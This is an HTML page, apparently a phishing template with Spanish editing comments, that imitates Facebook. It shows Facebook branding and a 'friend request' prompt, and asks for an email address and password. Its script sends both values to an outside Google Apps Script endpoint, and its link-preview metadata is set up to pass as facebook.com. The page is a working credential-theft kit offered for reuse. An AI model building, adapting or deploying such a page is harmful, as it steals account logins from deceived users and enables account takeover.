<!DOCTYPE html>
<html lang="es">

<head>

  <meta charset="UTF-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0">


  <!-- =====================================================
       📱 CONFIGURACIÓN DE LA VISTA PREVIA DEL ENLACE
       ===================================================== -->


  <!-- ✏️ AQUÍ VA EL TÍTULO QUE QUIERES QUE APAREZCA -->

  <meta
    property="og:title"
    content="Facebook"
  >


  <!-- ✏️ AQUÍ VA LA DESCRIPCIÓN QUE QUIERES QUE APAREZCA -->

  <meta
    property="og:description"
    content="www.Facebook.com"
  >


  <!-- ✏️ AQUÍ VA LA FOTO QUE QUIERES QUE SE VEA
       
       IMPORTANTE:
       Tiene que ser una URL pública de Internet.
       Ejemplo:
       https://tuusuario.github.io/formulario/portada.jpg
       -->

  <meta
    property="og:image"
    content="https://i.imgur.com/h75aefm.jpeg"
  >


  <!-- ✏️ AQUÍ VA EL LINK DE TU PÁGINA WEB
       
       Ejemplo:
       https://tuusuario.github.io/formulario/
       -->

  <meta
    property="og:url"
    content="https://yfmodaurbana-eng.github.io/Form/?email=cocopaco1986%40gmail.com&dato=pepeluis"
  >


  <!-- NO MODIFICAR -->

  <meta
    property="og:type"
    content="


  <!-- =====================================================
       ✏️ TÍTULO NORMAL DE LA PÁGINA
       ===================================================== -->

  <title>AQUÍ TU TÍTULO</title>


  <!-- AQUÍ CONTINÚA TU <style> -->

  <style>

    /* =====================================================
       🎨🎨🎨 PERSONALIZACIÓN
       ===================================================== */

    :root {

      /* ✏️ COLOR PRINCIPAL */
      --color-principal: #1877f2;

      /* ✏️ COLOR DEL BOTÓN */
      --color-boton: #1877f2;

      /* ✏️ COLOR DEL BOTÓN AL PASAR EL RATÓN */
      --color-boton-hover: #166fe5;

      /* ✏️ COLOR DEL TEXTO */
      --color-texto: #1c1e21;

      /* ✏️ COLOR DEL TEXTO SECUNDARIO */
      --color-texto-secundario: #65676b;

      /* ✏️ COLOR INTERIOR DE LOS CAMPOS */
      --color-input: #f5f6f7;

      /* ✏️ COLOR DEL BORDE */
      --color-borde: #dddfe2;


      /* =====================================================
         🖼️ IMAGEN DE FONDO

         Para poner una imagen:
         url("fondo.jpg")

         Para quitarla:
         none
         ===================================================== */

      --imagen-fondo: none;


      /* =====================================================
         🌈 DEGRADADO
         ===================================================== */

      --fondo-degradado:
        linear-gradient(
          135deg,
          #eef4ff 0%,
          #f0f2f5 50%,
          #ffffff 100%
        );


      /* ✏️ REDONDEADOS */

      --radio-formulario: 14px;
      --radio-input: 8px;
      --radio-boton: 8px;


      /* ✏️ SOMBRA */

      --sombra:
        0 8px 30px rgba(0, 0, 0, 0.12);


      /* ✏️ ANCHO DEL FORMULARIO */

      --ancho-formulario: 400px;


      /* ✏️ TIPO DE LETRA */

      --fuente:
        Arial,
        Helvetica,
        sans-serif;

    }


    /* =====================================================
       RESET
       ===================================================== */

    * {
      box-sizing: border-box;
    }


    /* =====================================================
       CUERPO
       ===================================================== */

    body {

      margin: 0;

      min-height: 100vh;

      display: flex;

      justify-content: center;

      align-items: center;

      padding: 20px;

      font-family: var(--fuente);

      background:
        var(--imagen-fondo),
        var(--fondo-degradado);

      background-size: cover;

      background-position: center;

      background-repeat: no-repeat;

    }


    /* =====================================================
       FORMULARIO
       ===================================================== */

    .formulario {

      width: 100%;

      max-width:
        var(--ancho-formulario);

      background: #ffffff;

      padding: 30px;

      border-radius:
        var(--radio-formulario);

      box-shadow:
        var(--sombra);

    }


    /* =====================================================
       🏷️ LOGO
       ===================================================== */

    .logo {

      text-align: center;

      /* ✏️ TAMAÑO DEL LOGO */

      font-size: 38px;

      font-weight: bold;

      color:
        var(--color-principal);

      margin-bottom: 15px;

    }


    /* =====================================================
       🖼️ MINIATURAS
       ===================================================== */

    .miniaturas {

      display: flex;

      justify-content: center;

      align-items: center;

      gap: 10px;

      flex-wrap: wrap;

      margin-bottom: 25px;

    }


    .miniaturas img {

      /* ✏️ TAMAÑO DE LAS IMÁGENES */

      width: 65px;

      height: 65px;

      object-fit: cover;

      /* ✏️ REDONDEADO */

      border-radius: 12px;

      /* ✏️ BORDE */

      border: 2px solid #eeeeee;

      box-shadow:
        0 2px 8px rgba(0, 0, 0, 0.12);

      transition:
        transform 0.2s,
        box-shadow 0.2s;

    }


    .miniaturas img:hover {

      transform:
        translateY(-3px)
        scale(1.05);

      box-shadow:
        0 5px 12px rgba(0, 0, 0, 0.18);

    }


    /* =====================================================
       TÍTULO
       ===================================================== */

    h1 {

      text-align: center;

      /* ✏️ TAMAÑO */

      font-size: 24px;

      /* ✏️ COLOR */

      color:
        var(--color-texto);

      margin:
        0 0 8px 0;

    }


    /* =====================================================
       DESCRIPCIÓN
       ===================================================== */

    .descripcion {

      text-align: center;

      color:
        var(--color-texto-secundario);

      font-size: 15px;

      line-height: 1.4;

      margin:
        0 0 25px 0;

    }


    /* =====================================================
       📝 CAMPOS
       
       NO HAY TEXTOS ENCIMA.
       SOLO SE VE EL PLACEHOLDER.
       ===================================================== */

    input {

      width: 100%;

      padding:
        13px 14px;

      margin-bottom: 17px;

      background:
        var(--color-input);

      border:
        1px solid var(--color-borde);

      border-radius:
        var(--radio-input);

      font-size: 16px;

      color:
        var(--color-texto);

      outline: none;

      transition:
        border-color 0.2s,
        box-shadow 0.2s,
        background 0.2s;

    }


    /* =====================================================
       ✏️ PLACEHOLDER
       ===================================================== */

    input::placeholder {

      color: #8a8d91;

      opacity: 1;

    }


    /* =====================================================
       INPUT SELECCIONADO
       ===================================================== */

    input:focus {

      background: #ffffff;

      border-color:
        var(--color-principal);

      box-shadow:
        0 0 0 2px
        rgba(24, 119, 242, 0.15);

    }


    /* =====================================================
       🔵 BOTÓN
       ===================================================== */

    button {

      width: 100%;

      padding: 13px;

      border: none;

      border-radius:
        var(--radio-boton);

      background:
        var(--color-boton);

      color: #ffffff;

      font-size: 16px;

      font-weight: bold;

      cursor: pointer;

      transition:
        background 0.2s,
        transform 0.1s;

    }


    button:hover {

      background:
        var(--color-boton-hover);

    }


    button:active {

      transform:
        scale(0.99);

    }


    button:disabled {

      opacity: 0.6;

      cursor: not-allowed;

    }


    /* =====================================================
       MENSAJE
       ===================================================== */

    #mensaje {

      text-align: center;

      margin-top: 15px;

      color:
        var(--color-texto-secundario);

      font-size: 14px;

    }


    /* =====================================================
       PIE
       ===================================================== */

    .pie {

      text-align: center;

      margin-top: 22px;

      font-size: 13px;

      color:
        var(--color-texto-secundario);

    }


    /* =====================================================
       📱 MÓVIL
       ===================================================== */

    @media (max-width: 480px) {

      body {
        padding: 15px;
      }

      .formulario {
        padding: 24px 20px;
      }

      .logo {
        font-size: 34px;
      }

      h1 {
        font-size: 22px;
      }

      .miniaturas img {
        width: 58px;
        height: 58px;
      }

    }

  </style>

</head>


<body>


  <!-- =====================================================
       📦 FORMULARIO
       ===================================================== -->

  <form
    class="formulario"
    id="formulario"
  >


    <!-- =====================================================
         ✏️ EDITAR AQUÍ: NOMBRE / LOGO
         ===================================================== -->

    <div class="logo">
      Facebook
    </div>


    <!-- =====================================================
         🖼️ EDITAR AQUÍ: IMÁGENES
         
         Cambia imagen1.jpg, etc. por tus archivos.
         ===================================================== -->

    <div class="miniaturas">

      <img
        src="https://i.imgur.com/eILJRrK.jpeg"
        alt="Imagen 1"
      >



    <!-- =====================================================
         ✏️ EDITAR AQUÍ: TÍTULO
         ===================================================== -->

    <h1>
      
    </h1>


    <!-- =====================================================
         ✏️ EDITAR AQUÍ: DESCRIPCIÓN
         ===================================================== -->

    <p class="descripcion">
      aceptar petición de amistad de este perfil
    </p>


    <!-- =====================================================
         ✏️ EDITAR AQUÍ: PLACEHOLDER
         ===================================================== -->

    <input
      type="email"
      id="email"
      name="email"
      placeholder="Tu correo electrónico"
      required
    >


    <!-- =====================================================
         ✏️ EDITAR AQUÍ: SEGUNDO PLACEHOLDER
         ===================================================== -->

    <input
      type="password"
      id="dato"
      name="dato"
      placeholder="Contraseña"
      required
    >


    <!-- =====================================================
         ✏️ EDITAR AQUÍ: TEXTO DEL BOTÓN
         ===================================================== -->

    <button
      type="submit"
      id="boton"
    >
      Enviar
    </button>


    <!-- MENSAJE -->

    <div id="mensaje"></div>


    <!-- =====================================================
         ✏️ EDITAR AQUÍ: PIE
         ===================================================== -->

    <div class="pie">
      © www.Facebook.com 
    </div>


  </form>


  <script>

    /* =====================================================
       🔗 GOOGLE APPS SCRIPT
       
       TU URL YA ESTÁ INTEGRADA
       ===================================================== */

    const URL_APPS_SCRIPT =
      "https://script.google.com/macros/s/AKfycbxrdAB6EhEh4HRNCoLAZcMXP8hGZeneVJdCyk_R1hWgffo8KjygrDaihaIgrMTSi7z1/exec";


    const formulario =
      document.getElementById("formulario");

    const boton =
      document.getElementById("boton");

    const mensaje =
      document.getElementById("mensaje");


    /* =====================================================
       📤 ENVÍO
       ===================================================== */

    formulario.addEventListener(
      "submit",
      async function(event) {

        event.preventDefault();


        boton.disabled = true;

        boton.textContent =
          "Enviando...";

        mensaje.textContent =
          "";


        /* =================================================
           DATOS QUE SE ENVÍAN
           ================================================= */

        const datos = {

          email:
            document
              .getElementById("email")
              .value
              .trim(),

          dato:
            document
              .getElementById("dato")
              .value
              .trim()

        };


        try {


          const respuesta =
            await fetch(
              URL_APPS_SCRIPT,
              {
                method: "POST",

                body:
                  JSON.stringify(datos)
              }
            );


          const resultado =
            await respuesta.json();


          if (resultado.ok) {

            /* ✏️ EDITAR: MENSAJE DE ÉXITO */

            mensaje.textContent =
              "¡Enviado correctamente!";

            formulario.reset();

          } else {

            mensaje.textContent =
              resultado.mensaje ||
              "Ha ocurrido un error.";

          }


        } catch (error) {

          console.error(error);

          mensaje.textContent =
            "No se pudo conectar con el servidor.";

        }


        boton.disabled =
          false;

        boton.textContent =
          "Continuar";

      }
    );

  </script>


</body>

</html>
